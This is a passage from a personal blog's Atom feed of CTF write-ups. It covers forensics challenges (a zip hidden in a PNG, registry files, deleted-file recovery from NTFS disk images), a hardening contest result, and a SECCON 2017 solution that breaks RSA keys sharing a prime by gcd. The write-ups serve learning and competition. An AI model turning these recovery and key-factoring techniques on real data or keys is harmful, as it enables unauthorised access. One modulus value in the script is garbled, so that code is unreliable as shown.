title="問題"></a>問題</h2><p>ctf4g.pngの中からflagを得る</p><h2 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h2><p>ctf4g.pngをバイナリエディタで開くと文字列 <code>hoge/flag.bmp</code> <code>hoge/flag.bmpPK</code> が確認できる<br>PKはzipのマジックナンバーなのでpngの中にzipが埋め込まれていると当たりをつけ、<code>hoge/flag.bmp</code> の少し前にある <code>PK</code> より前のデータをすべて削除し解凍する</p><p><a href="3.png"><img src="3.png" alt="alt" title="3.png" width="700"></a><br><a href="4.png"><img src="4.png" alt="alt" title="4.png" width="700"></a></p><h1 id="中級問題2"><a href="#中級問題2" class="headerlink" title="中級問題2"></a>中級問題2</h1><h2 id="問題-4"><a href="#問題-4" class="headerlink" title="問題"></a>問題</h2><p>ファイル <code>My_Message_is_a_Flag</code> とテキスト <code>外出するので伝言を残しておきますね。</code> が渡される</p><h2 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h2><p><code>My_Message_is_a_Flag</code> のマジックナンバーからレジストリファイルであることが分かる<br>AccessData Registory Viewerで開き、伝言に関連がありそうな怪しいディレクトリを見るとflagが得られる</p><p><a href="5.png"><img src="5.png" alt="alt" title="5.png" width="700"></a><br><a href="6.png"><img src="6.png" alt="alt" title="6.png" width="700"></a></p><p>(自分はレジストリの知識が無いので怪しそうなディレクトリが分からず探すのが大変だった)</p><h1 id="上級問題1"><a href="#上級問題1" class="headerlink" title="上級問題1"></a>上級問題1</h1><h2 id="問題-5"><a href="#問題-5" class="headerlink" title="問題"></a>問題</h2><p>ファイル <code>Forensics_advanced.E01</code> とテキスト <code>仲間はずれはどれ？</code> が渡される</p><h2 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h2><p>fileコマンドでimage fileであることを確認<br>AccessData FTK Imagerで開くとディレクトリ <code>[root]/flag/flag.zip</code> があり、Exportして解凍しようとするとパスワードを要求される</p><p>image fileの <code>[root]/pass</code> にFlagXXX.txtが300個あり、この中にパスワードが書かれていると当たりをつける<br>与えられたテキストをヒントに仲間はずれを探すと、Sizeが唯一0, Date Modifiedが他のファイルと異なっているFlag263.txtが見つかる<br>Flag263.txtの内容は削除されているが、ファイルシステムがNTFSで削除したファイルのサイズが小さいので <code>[root]/$MFT</code> に内容が残っており、そこにパスワードが書かれている</p><p>このパスワードでflag.zipを解凍すると画像としてflagが書かれたFlag.jpgが得られる</p><h2 id="補足-1"><a href="#補足-1" class="headerlink" title="補足"></a>補足</h2><p>$MFTはNTFSで使われるマスターファイルテーブルで、全てのファイルのエントリを管理している<br>エントリはレコードタイプ, レコード番号, Active/Inactiveフラグ, $DATA属性などを含む<br>約680byte以下のファイルの場合は$DATA属性にファイル内容が記録される</p><p><a href="7.png"><img src="7.png" alt="alt" title="7.png" width="700"></a><br><a href="8.png"><img src="8.png" alt="alt" title="8.png" width="800"></a><br><a href="9.png"><img src="9.png" alt="alt" title="9.png" width="900"></a></p><h1 id="上級問題2"><a href="#上級問題2" class="headerlink" title="上級問題2"></a>上級問題2</h1><h2 id="問題-6"><a href="#問題-6" class="headerlink" title="問題"></a>問題</h2><p>ファイル <code>Forensics300.E01</code> とテキスト <code>兵器密売に関する情報を入手した！このファイルを解析し、兵器密売の場所となる情報を取り出せ！</code> が渡される</p><h2 id="解答-6"><a href="#解答-6" class="headerlink" title="解答"></a>解答</h2><p>AccessData FTK Imagerで開くとディレクトリ <code>[root]/The site.zip</code> があり、Exportして解凍しようとするとパスワードを要求される<br>削除済みファイル <code>[root]/secret_pass.txt</code> があり、これはunallocated spaceに残っているので復元可能  </p><p>入手したパスワードでThe site.zipを解凍するとSite.docxが得られ、これをSite.zipにリネームして解凍<br>word/media/image1.jpegのExif情報からflagが得られる</p><h2 id="補足-2"><a href="#補足-2" class="headerlink" title="補足"></a>補足</h2><p>unallocated spaceでは削除されInactiveフラグが立っているファイルが確認できる</p><p><a href="10.png"><img src="10.png" alt="alt" title="10.png" width="1000"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;環境&quot;&gt;&lt;a href=&quot;#環境&quot; class=&quot;headerlink&quot; title=&quot;環境&quot;&gt;&lt;/a&gt;環境&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;env.png&quot;&gt;&lt;img src=&quot;env.png&quot; alt=&quot;alt&quot; title=&quot;env.png&quot; width=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hardening 2017 Fes</title>
    <link href="http://suzupy.github.com/hardening2017fes/"/>
    <id>http://suzupy.github.com/hardening2017fes/</id>
    <published>2017-12-14T08:09:30.000Z</published>
    <updated>2017-12-16T12:07:00.095Z</updated>
    
    <content type="html"><![CDATA[<p>Team Noresore11のLinux担当で参加  </p><p>見込み販売力(総合点): 2位<br>顧客点: 2位<br>技術点: 1位<br>対応点: 2位</p><p>Trend Micro賞 受賞</p><p>結果発表の様子 (06:07:00~) : <a href="https://www.youtube.com/watch?v=me4rM9OVtNg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=me4rM9OVtNg</a>  </p><p><img src="1.jpg" alt="alt" title="1.jpg" width="600"><br><img src="2.png" alt="alt" title="2.png" width="600"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Team Noresore11のLinux担当で参加  &lt;/p&gt;
&lt;p&gt;見込み販売力(総合点): 2位&lt;br&gt;顧客点: 2位&lt;br&gt;技術点: 1位&lt;br&gt;対応点: 2位&lt;/p&gt;
&lt;p&gt;Trend Micro賞 受賞&lt;/p&gt;
&lt;p&gt;結果発表の様子 (06:07:00~) : 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SECCON 2017 Writeup</title>
    <link href="http://suzupy.github.com/seccon2017/"/>
    <id>http://suzupy.github.com/seccon2017/</id>
    <published>2017-12-11T20:52:16.000Z</published>
    <updated>2017-12-12T17:12:53.080Z</updated>
    
    <content type="html"><![CDATA[<p>My team solved <code>Vigenere3d</code>, <code>Run me!</code>, <code>putchar music</code>, <code>SHA-1 is dead</code> and <code>Thank you for playing!</code> and got 500 points.</p><h1 id="putchar-music"><a href="#putchar-music" class="headerlink" title="putchar music"></a>putchar music</h1><p>I searched <code>putchar music</code> then found <a href="https://www.youtube.com/watch?v=L9KLnN0GczI" target="_blank" rel="noopener">Creating music in one line of C code</a>.<br>/dev/dsp is one of driver used in OSS (Open Sound System) but it is old slightly.<br>Instead of it, we can use ALSA installed in Ubuntu 17.10 by default.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat a.c</span><br><span class="line"><span class="function"><span class="title">main</span></span>()&#123;int t,i,j; unsigned char p[]=<span class="string">"###&lt;f_YM\204g_YM\204g_Y_H #&lt;f_YM\204g_YM\204g_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk\206\203tk\\YJAfkkk"</span>;<span class="keyword">for</span>(i=0;t=1;i=(i+1)%(sizeof(p)-1))&#123;double x=pow(1.05946309435931,p[i]/6+13);<span class="keyword">for</span>(j=1+p[i]%6;t++%(8192/j);)putchar(t&gt;&gt;5|(int)(t*x));&#125;&#125;</span><br><span class="line">$ gcc a.c -lm &gt; /dev/null 2&gt;&amp;1; ./a.out | aplay</span><br></pre></td></tr></table></figure><h1 id="Ps-and-Qs"><a href="#Ps-and-Qs" class="headerlink" title="Ps and Qs"></a>Ps and Qs</h1><p>ref: <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation</a></p><p>In this problem, pub1 and pub2 are using the same prime number.<br>Therefore we can calcurate <em>p</em> and <em>q</em> by <code>p = gcd(pub1, pub2)</code> <code>q = pub1 / p</code> and create the private key by following steps:</p><blockquote><ol><li>Choose two distinct prime numbers p and q.</li><li>Compute n = pq.</li><li>Compute λ(n) = lcm(λ(p), λ(q)) = lcm(p − 1, q − 1), where λ is Carmichael’s totient function. This value is kept private.</li><li>Choose an integer e such that 1 &lt; e &lt; λ(n) and gcd(e, λ(n)) = 1; i.e., e and λ(n) are coprime.</li><li>Determine d as d ≡ e−1 (mod λ(n)); i.e., d is the modular multiplicative inverse of e (modulo λ(n)).</li></ol></blockquote><p><em>p</em>, <em>q</em> and <em>e</em> are already given.<br><em>d</em> satisfy a formula <code>e * d (mod λ(n)) = 1</code> so we can calculate it by using <a href="https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm" target="_blank" rel="noopener">Extended Euclidean algorithm</a>.</p><blockquote><p>Decryption</p><p>Alice can recover m from c by using her private key exponent d by computing<br>c^d ≡ (m^e)^d ≡ m (mod n)<br>Given m, she can recover the original message M by reversing the padding scheme.</p></blockquote><p>Now <em>c</em> and <em>d</em> are known, so we can decrypt the cipher.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -text -modulus -pubin &lt; pub1.pub 2&gt;&amp;1 | grep Exponent | awk <span class="string">'&#123;print $2&#125;'</span></span><br><span class="line">65537</span><br><span class="line">$ openssl rsa -text -modulus -pubin &lt; pub1.pub 2&gt;&amp;1 | grep Modulus= | awk -F= <span class="string">'&#123;print "0x"$2&#125;'</span></span><br><span class="line">0xspan><br><span class="line">$ openssl rsa -text -modulus -pubin &lt; pub2.pub 2&gt;&amp;1 | grep Modulus= | awk -F= <span class="string">'&#123;print "0x"$2&#125;'</span></span><br><span class="line">0xBB33CC7FCC8ECAF3BF9ED95C583792E1EC6B80EE875EC2064DBCF07595C8344923BF536524D4E0A75574C7798C73B197DD2B1B42054B1E49CB45FBF04E6F114CF8A365C3DF3645524F778268038A3FA26802E9D1EDBFBB5EDFB5A0C375370D7F10F57DABBD4F771DAD3632F01B9BCE10489966EE882DAB17A33B786AA5F73165A54051300B1DF9280392A3EDE9D3FC9C4D8A6A06351F6EF3598E8DE2B39D3B19AF64A1716CD15826C3F24CB13DEB722C3A03EF1D2BE2D0A5A6E210FF5D018367BE3BF99EA26BA006E5164A4DD55AABCD449DE5CE1864825DC160E50D509EB0E6FE723EF182681EDDB94084B83EC9E2E943E87CB87509AB0FD9B1CA22C1CEAFF39FCACF6729FC0E0578670D87D7F0F9CCBE09CB3E12CEB895572A9979D10BFDBFAFA260568D8DB184BE12B3E3193E07729CE3C1D9CD8283ED6983A06388036A0A70294F23392944778280E7DE9F60163A8150E30FF4A4EA02792CBE8305BAA2E99AFE51E17DAFC56BE0D384147BCD38E9D12934EC712622217773A4B3851A9B0C6C7C3E01F6111A1E1A557F4E2AE4A247CE9B75CCCCB1819825F3054AA1C055BD3E2340093AE2EF1D0FA5A176825EFDF79507027F5104080009142F0D43E2F10CFAD220813BBB9014D4F4325EDAC538FB5E82B753E2AD3B24607D7380AA64FCB98B59EA8B5A736B809383248CECE0B17255EA559E90127F778AF6D7E8A66DAD91</span><br><span class="line">$ od -An -tx1 cipher | tr <span class="string">"\n"</span> <span class="string">" "</span> | sed <span class="string">'s/ //g'</span> | awk <span class="string">'&#123;print "0x"$1&#125;'</span></span><br><span class="line">0xa14ddfb8cb18cf8b22e898e7ce6a2050b2f732e462b987cd5924605eac67c6d2ce2e95ea688299aec2d3b4b9544d6c30ab6d1f55c8e498b9be30dbb4a8bdd7300aa51cd00812db242c8b58952338f1e37439c74dc063f85c4997c5a7dd99ff4cba4322ba7bcf8c967a5c4d8560dda2607454605339a28cdc0c046e51ac828e6913588509be1e9492af42e01cac6a0301244dcadaebfbe8408120d7136cf3440348095b8996c3a3306c4bb6f0959c821137c64e1d6eb6bbabf60529166b777e6fc02afe0194683622f3420077097d7987786d06f601f9231677340e288828ee9a56e6e57a5f9435468a252765289e56b8ae9eec7189aca04f556eac0af3c30f862440f61bda0fbbd92975c8f83b78b6ad586dc3697955ff92b222b585017f8b58119707c65e222cde343da8f4f058b78d2554fd624a22df567c51fcac5f51498828c775a2a67a5ec0a6e10a3f329d2b3e42cf1666268b174eab14501d89ffaa6943c059f81b00cc29f827ef489f99ccc94cd3b5780924f25c76c85e867df5134d2ea1e45f9c1a6c74b143eb0c051254aede5d0f4e2deca6461f482703b75f0df85542ee25783ffd6ee1dd508c1b7679e17bd2030040a82e7873bb4c5cc83db817f7d7cb776c178f8750f8b5f3c00839cf005e0aadbe6ecfc14c6d603f3feb6c1eaf98b9c902b098867b5505bc14ab3b359f7f6218e6713ae9ed5a1025b8adc415</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>ps_and_qs.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto_commons.rsa.rsa_commons <span class="keyword">import</span> gcd, modinv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">pub1 = <span class="number">0xspan></span><br><span class="line">pub2 = <span class="number">0xBB33CC7FCC8ECAF3BF9ED95C583792E1EC6B80EE875EC2064DBCF07595C8344923BF536524D4E0A75574C7798C73B197DD2B1B42054B1E49CB45FBF04E6F114CF8A365C3DF3645524F778268038A3FA26802E9D1EDBFBB5EDFB5A0C375370D7F10F57DABBD4F771DAD3632F01B9BCE10489966EE882DAB17A33B786AA5F73165A54051300B1DF9280392A3EDE9D3FC9C4D8A6A06351F6EF3598E8DE2B39D3B19AF64A1716CD15826C3F24CB13DEB722C3A03EF1D2BE2D0A5A6E210FF5D018367BE3BF99EA26BA006E5164A4DD55AABCD449DE5CE1864825DC160E50D509EB0E6FE723EF182681EDDB94084B83EC9E2E943E87CB87509AB0FD9B1CA22C1CEAFF39FCACF6729FC0E0578670D87D7F0F9CCBE09CB3E12CEB895572A9979D10BFDBFAFA260568D8DB184BE12B3E3193E07729CE3C1D9CD8283ED6983A06388036A0A70294F23392944778280E7DE9F60163A8150E30FF4A4EA02792CBE8305BAA2E99AFE51E17DAFC56BE0D384147BCD38E9D12934EC712622217773A4B3851A9B0C6C7C3E01F6111A1E1A557F4E2AE4A247CE9B75CCCCB1819825F3054AA1C055BD3E2340093AE2EF1D0FA5A176825EFDF79507027F5104080009142F0D43E2F10CFAD220813BBB9014D4F4325EDAC538FB5E82B753E2AD3B24607D7380AA64FCB98B59EA8B5A736B809383248CECE0B17255EA559E90127F778AF6D7E8A66DAD91</span></span><br><span class="line">cipher = <span class="number">0xa14ddfb8cb18cf8b22e898e7ce6a2050b2f732e462b987cd5924605eac67c6d2ce2e95ea688299aec2d3b4b9544d6c30ab6d1f55c8e498b9be30dbb4a8bdd7300aa51cd00812db242c8b58952338f1e37439c74dc063f85c4997c5a7dd99ff4cba4322ba7bcf8c967a5c4d8560dda2607454605339a28cdc0c046e51ac828e6913588509be1e9492af42e01cac6a0301244dcadaebfbe8408120d7136cf3440348095b8996c3a3306c4bb6f0959c821137c64e1d6eb6bbabf60529166b777e6fc02afe0194683622f3420077097d7987786d06f601f9231677340e288828ee9a56e6e57a5f9435468a252765289e56b8ae9eec7189aca04f556eac0af3c30f862440f61bda0fbbd92975c8f83b78b6ad586dc3697955ff92b222b585017f8b58119707c65e222cde343da8f4f058b78d2554fd624a22df567c51fcac5f51498828c775a2a67a5ec0a6e10a3f329d2b3e42cf1666268b174eab14501d89ffaa6943c059f81b00cc29f827ef489f99ccc94cd3b5780924f25c76c85e867df5134d2ea1e45f9c1a6c74b143eb0c051254aede5d0f4e2deca6461f482703b75f0df85542ee25783ffd6ee1dd508c1b7679e17bd2030040a82e7873bb4c5cc83db817f7d7cb776c178f8750f8b5f3c00839cf005e0aadbe6ecfc14c6d603f3feb6c1eaf98b9c902b098867b5505bc14ab3b359f7f6218e6713ae9ed5a1025b8adc415</span></span><br><span class="line"></span><br><span class="line">p = gcd(pub1, pub2)</span><br><span class="line">q = pub1 / p</span><br><span class="line">d = modinv(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">b = pow(cipher, d, pub1)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(b)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python ps_and_qs.py</span><br><span class="line">�H4؋ѝ2l�r</span><br><span class="line">�puF`u�܎��3�4CT�R</span><br><span class="line">  ��V�.dZ[]���%��)() _�d�</span><br><span class="line">                         |�o�h�o�V��s&#123;t_�vӫ�1ۧ�[:�X�Y��%�%��r�9dJ�|�������7��M��</span><br><span class="line">                                                                               g�B����݁t^Scq�`H�0�c�f��Ŏ\�</span><br><span class="line">                                                                                                         6�a ��<span class="string">"5`�_�et:</span></span><br><span class="line"><span class="string">��a�C=�L�X�UmL�b�'���\�X��3��l&gt;��(W!��T����e�DǷ.��?f�L.�U������nR~J�.�'�&amp;/��w����!A�wS"</span>U��Z�*����E�T�d�w�@�J!�=��<span class="string">"��,����Dh����������(�l���4UayXg4Ї4Z�Z��Ma��5���|�ۻ�;Z�-S�@��]&gt;\n6&gt;�g�MBK��E�@�a�VYԹB�p���`[�5�1�],�GA"</span>.�</span><br><span class="line">                                  ��5�摨SECCON&#123;1234567890ABCDEF&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;My team solved &lt;code&gt;Vigenere3d&lt;/code&gt;, &lt;code&gt;Run me!&lt;/code&gt;, &lt;code&gt;putchar music&lt;/code&gt;, &lt;code&gt;SHA-1 is dead&lt;/code&gt; and &lt;code&gt;Thank you 
      
    
    </summary>
    
    
  </entry>
  
</feed>
